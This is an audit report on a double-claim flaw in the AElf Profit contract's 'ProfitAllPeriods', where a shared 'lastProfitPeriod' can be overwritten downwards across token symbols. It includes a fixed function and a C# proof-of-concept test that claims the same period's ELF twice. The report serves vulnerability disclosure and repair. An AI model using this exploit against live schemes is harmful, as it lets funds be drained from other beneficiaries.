# Audit Report

## Title
LastProfitPeriod Backwards Update Enables Double-Claiming of Profits in Multi-Token Schemes

## Summary
The `ProfitAllPeriods` function contains a critical logic error where a shared `lastProfitPeriod` variable is updated inside nested loops over multiple token symbols. When processing symbols with uneven distribution patterns across periods, later-processed symbols can overwrite `lastProfitPeriod` to a lower value, enabling beneficiaries to re-claim already-claimed periods and steal funds.

## Finding Description

The vulnerability exists in the `ProfitAllPeriods` private method where the `lastProfitPeriod` tracking variable is initialized once but updated within nested loops. [1](#0-0) 

The function processes profit claims across multiple token symbols and multiple periods. The outer loop iterates over token symbols, while the inner loop iterates over periods for each symbol. [2](#0-1) 

For each period where a symbol has distributed profits, the code unconditionally updates `lastProfitPeriod = period + 1` after transferring funds. [3](#0-2) 

The critical flaw is that this shared variable gets overwritten by each symbol's processing. When Symbol A has distributions in periods 1-3 (setting `lastProfitPeriod = 4`), but Symbol B only has distributions in periods 1-2, Symbol B's processing will overwrite the value to `lastProfitPeriod = 3`. The final value written to state is the last value assigned, not the maximum. [4](#0-3) 

While there is a `continue` statement that skips processing when a symbol doesn't have a distribution for a specific period, this only prevents the update for missing periods - it doesn't prevent overwrites when the symbol DOES have distributions in earlier periods. [5](#0-4) 

The `ClaimProfits` public method calls `ProfitAllPeriods` and then saves the updated `profitDetail` back to state, persisting the incorrect `LastProfitPeriod` value. [6](#0-5) [7](#0-6) 

Multi-token schemes are explicitly supported, with symbols added to `scheme.ReceivedTokenSymbols` when profits are contributed in different tokens. [8](#0-7) 

## Impact Explanation

**Direct Fund Theft**: This vulnerability allows a beneficiary to claim the same period's profits multiple times for symbols that were distributed in periods that get "rolled back" by the bug. The stolen funds come from either other beneficiaries' shares or remain incorrectly withdrawn from the period's virtual address.

**Quantified Damage**: In a scheme where:
- Beneficiary has 50% shares
- Period 3 distributed 1000 ELF and 0 USDT
- Periods 1-2 distributed both ELF and USDT

The beneficiary should receive 500 ELF from period 3 once. With this vulnerability, they can claim period 3 twice, stealing an additional 500 ELF (total 1000 ELF from period 3 alone).

**Affected Parties**: All other beneficiaries lose their proportional share as the total claimed exceeds what was distributed. The profit scheme's accounting integrity is violated as `LastProfitPeriod` no longer accurately tracks claimed periods.

**Severity**: HIGH - This enables direct, repeatable theft of funds with no special privileges required beyond being a registered beneficiary in a multi-token scheme.

## Likelihood Explanation

**Attacker Capabilities**: The attacker only needs to be a registered beneficiary in a profit scheme that tracks multiple token symbols. No manager privileges, organization approval, or role compromise is required.

**Attack Complexity**: LOW - The vulnerability triggers automatically during normal `ClaimProfits` operations when:
1. A profit scheme has multiple token symbols in its `ReceivedTokenSymbols` list
2. Different periods have different symbols distributed (a natural operational pattern)
3. The beneficiary calls the standard `ClaimProfits` method

**Feasibility**: VERY HIGH - Multi-token profit schemes are fundamental to AElf's economic model, commonly tracking ELF, USDT, and other tokens. Distribution patterns naturally vary by period based on what tokens are contributed to the scheme at different times. The symbol processing order is determined by contribution order and cannot be manipulated by attackers, but the vulnerability exists regardless of order.

**Detection Constraints**: The double-claim appears as legitimate `ClaimProfits` transactions. While `ProfitsClaimed` events will show the same period being claimed multiple times, this requires careful monitoring and understanding of the expected claim pattern. [9](#0-8) 

**Probability**: MEDIUM-HIGH - Occurs whenever multi-token schemes have uneven symbol distributions across periods, which is a realistic and common operational pattern in profit distribution systems.

## Recommendation

Track `lastProfitPeriod` per symbol or maintain a single maximum across all symbols. The fix should ensure `lastProfitPeriod` only increases, never decreases:

```csharp
private Dictionary<string, long> ProfitAllPeriods(Scheme scheme, ProfitDetail profitDetail, Address beneficiary, long maxProfitReceivingPeriodCount,
    bool isView = false, string targetSymbol = null)
{
    var profitsMap = new Dictionary<string, long>();
    var lastProfitPeriod = profitDetail.LastProfitPeriod;
    
    var symbols = targetSymbol == null ? scheme.ReceivedTokenSymbols.ToList() : new List<string> { targetSymbol };
    
    foreach (var symbol in symbols)
    {
        var totalAmount = 0L;
        var targetPeriod = Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod);
        var maxProfitPeriod = profitDetail.EndPeriod == long.MaxValue
            ? Math.Min(scheme.CurrentPeriod - 1, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount))
            : Math.Min(targetPeriod, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount));
        
        for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
        {
            var distributedPeriodProfitsVirtualAddress =
                GetDistributedPeriodProfitsVirtualAddress(scheme.SchemeId, period);
            var distributedProfitsInformation =
                State.DistributedProfitsMap[distributedPeriodProfitsVirtualAddress];
            
            if (distributedProfitsInformation == null || distributedProfitsInformation.TotalShares == 0 ||
                !distributedProfitsInformation.AmountsMap.Any() ||
                !distributedProfitsInformation.AmountsMap.ContainsKey(symbol))
                continue;
            
            var amount = SafeCalculateProfits(profitDetail.Shares,
                distributedProfitsInformation.AmountsMap[symbol], distributedProfitsInformation.TotalShares);
            
            if (!isView)
            {
                if (distributedProfitsInformation.IsReleased && amount > 0)
                {
                    if (State.TokenContract.Value == null)
                        State.TokenContract.Value =
                            Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);
                    
                    Context.SendVirtualInline(
                        GeneratePeriodVirtualAddressFromHash(scheme.SchemeId, period),
                        State.TokenContract.Value,
                        nameof(State.TokenContract.Transfer), new TransferInput
                        {
                            To = beneficiary,
                            Symbol = symbol,
                            Amount = amount
                        }.ToByteString());
                    
                    Context.Fire(new ProfitsClaimed
                    {
                        Beneficiary = beneficiary,
                        Symbol = symbol,
                        Amount = amount,
                        ClaimerShares = profitDetail.Shares,
                        TotalShares = distributedProfitsInformation.TotalShares,
                        Period = period
                    });
                }
                
                // FIX: Only update to maximum value seen
                lastProfitPeriod = Math.Max(lastProfitPeriod, period + 1);
            }
            
            totalAmount = totalAmount.Add(amount);
        }
        
        profitsMap.Add(symbol, totalAmount);
    }
    
    profitDetail.LastProfitPeriod = lastProfitPeriod;
    
    return profitsMap;
}
```

The key change is replacing `lastProfitPeriod = period + 1;` with `lastProfitPeriod = Math.Max(lastProfitPeriod, period + 1);` to ensure the tracking variable only advances forward.

## Proof of Concept

```csharp
[Fact]
public async Task ProfitContract_DoubleClaimVulnerability_MultiplTokens_Test()
{
    const long shares = 100;
    const long amountELF = 1000;
    const long amountUSDT = 500;
    const string USDT = "USDT";
    
    // Setup: Create USDT token
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = USDT,
        TokenName = "USDT Token",
        TotalSupply = 1000000,
        Decimals = 8,
        Issuer = Starter,
        IsBurnable = true
    });
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = USDT,
        Amount = 100000,
        To = Starter
    });
    
    var creator = Creators[0];
    var beneficiary = Normal[0];
    var beneficiaryAddress = Address.FromPublicKey(NormalKeyPair[0].PublicKey);
    
    // Create scheme and add beneficiary with 100% shares
    var schemeId = await CreateSchemeAsync();
    await creator.AddBeneficiary.SendAsync(new AddBeneficiaryInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare { Beneficiary = beneficiaryAddress, Shares = shares },
    });
    
    // Contribute initial funds
    await ContributeProfits(schemeId, amountELF * 3);
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Spender = ProfitContractAddress,
        Symbol = USDT,
        Amount = amountUSDT * 3
    });
    
    // Distribute Period 1: ELF + USDT
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 1,
        AmountsMap = {
            { ProfitContractTestConstants.NativeTokenSymbol, amountELF },
            { USDT, amountUSDT }
        }
    });
    
    // Distribute Period 2: ELF + USDT
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 2,
        AmountsMap = {
            { ProfitContractTestConstants.NativeTokenSymbol, amountELF },
            { USDT, amountUSDT }
        }
    });
    
    // Distribute Period 3: ONLY ELF (no USDT)
    await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeId = schemeId,
        Period = 3,
        AmountsMap = {
            { ProfitContractTestConstants.NativeTokenSymbol, amountELF }
        }
    });
    
    var initialBalance = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = ProfitContractTestConstants.NativeTokenSymbol
    })).Balance;
    
    // First ClaimProfits - should claim periods 1, 2, 3
    await beneficiary.ClaimProfits.SendAsync(new ClaimProfitsInput { SchemeId = schemeId });
    
    var balanceAfterFirstClaim = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = ProfitContractTestConstants.NativeTokenSymbol
    })).Balance;
    
    // Should have received 3000 ELF (100% of periods 1+2+3)
    balanceAfterFirstClaim.ShouldBe(initialBalance + amountELF * 3);
    
    // Check LastProfitPeriod - BUG: it will be 3 instead of 4
    var details = await creator.GetProfitDetails.CallAsync(new GetProfitDetailsInput
    {
        SchemeId = schemeId,
        Beneficiary = beneficiaryAddress
    });
    
    // VULNERABILITY: LastProfitPeriod is incorrectly set to 3
    details.Details[0].LastProfitPeriod.ShouldBe(3); // Should be 4!
    
    // Second ClaimProfits - SHOULD NOT transfer any funds, but WILL due to bug
    await beneficiary.ClaimProfits.SendAsync(new ClaimProfitsInput { SchemeId = schemeId });
    
    var balanceAfterSecondClaim = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = beneficiaryAddress,
        Symbol = ProfitContractTestConstants.NativeTokenSymbol
    })).Balance;
    
    // VULNERABILITY DEMONSTRATED: Received period 3 ELF AGAIN (double claim)
    balanceAfterSecondClaim.ShouldBe(balanceAfterFirstClaim + amountELF); // 1000 ELF stolen!
    
    // Total stolen: beneficiary received 4000 ELF but only 3000 was legitimately theirs
}
```

**Notes**

The vulnerability is rooted in the fundamental design flaw of using a single shared variable to track progress across heterogeneous data (multiple token symbols with independent distribution patterns). The fix requires ensuring monotonic progression of the tracking variable, or alternatively, maintaining separate tracking per symbol. This bug would be triggered in any real-world AElf deployment where profit schemes handle multiple token types with varying contribution patterns across periods.

### Citations

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L716-716)
```csharp
        if (!scheme.ReceivedTokenSymbols.Contains(input.Symbol)) scheme.ReceivedTokenSymbols.Add(input.Symbol);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L784-784)
```csharp
            ProfitAllPeriods(scheme, profitDetail, beneficiary, maxProfitReceivingPeriodCount);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L806-806)
```csharp
        State.ProfitDetailsMap[input.SchemeId][beneficiary] = new ProfitDetails { Details = { availableDetails } };
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L849-849)
```csharp
        var lastProfitPeriod = profitDetail.LastProfitPeriod;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L853-860)
```csharp
        foreach (var symbol in symbols)
        {
            var totalAmount = 0L;
            var targetPeriod = Math.Min(scheme.CurrentPeriod - 1, profitDetail.EndPeriod);
            var maxProfitPeriod = profitDetail.EndPeriod == long.MaxValue
                ? Math.Min(scheme.CurrentPeriod - 1, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount))
                : Math.Min(targetPeriod, profitDetail.LastProfitPeriod.Add(maxProfitReceivingPeriodCount));
            for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L868-871)
```csharp
                if (distributedProfitsInformation == null || distributedProfitsInformation.TotalShares == 0 ||
                    !distributedProfitsInformation.AmountsMap.Any() ||
                    !distributedProfitsInformation.AmountsMap.ContainsKey(symbol))
                    continue;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L897-905)
```csharp
                        Context.Fire(new ProfitsClaimed
                        {
                            Beneficiary = beneficiary,
                            Symbol = symbol,
                            Amount = amount,
                            ClaimerShares = detailToPrint.Shares,
                            TotalShares = distributedProfitsInformation.TotalShares,
                            Period = periodToPrint
                        });
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L908-908)
```csharp
                    lastProfitPeriod = period + 1;
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L917-917)
```csharp
        profitDetail.LastProfitPeriod = lastProfitPeriod;
```
